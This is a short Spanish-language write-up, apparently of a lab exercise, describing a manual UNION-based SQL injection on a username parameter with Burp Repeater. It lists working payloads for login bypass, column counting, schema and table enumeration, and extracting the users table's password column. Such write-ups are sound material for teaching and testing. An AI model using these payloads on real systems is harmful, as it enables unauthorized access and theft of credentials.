# SQL Injection

Durante las pruebas en el parámetro `username`, observé una diferencia de respuesta entre usuarios existentes y no existentes. Con Burp repeater confirmé la inyección usando:

    admin' OR 1=1-- -
    admin' UNION SELECT NULL-- -

Probé el número de columnas mediante:

    ' ORDER BY 1--
    ' ORDER BY 2--
    ' ORDER BY 3--

Con `ORDER BY 3` la app fallaba → la tabla tenía 2 columnas.  
Probé:

    ' UNION SELECT 1,2--

Mostró el valor "2" en la interfaz. Procedí a enumerar:

Base de datos disponible:

    ' UNION SELECT null, schema_name FROM information_schema.schemata--

Tablas:

    ' UNION SELECT null, table_name FROM information_schema.tables WHERE table_schema='app'--

Columnas:

    ' UNION SELECT null, column_name FROM information_schema.columns WHERE table_name='users'--

Finalmente extraje contenido con:

    ' UNION SELECT null, password FROM users--

El ejercicio demuestra dominio de Burp Suite, SQLi manual, técnicas UNION-based, discovery de esquema y enumeración sin herramientas automáticas.
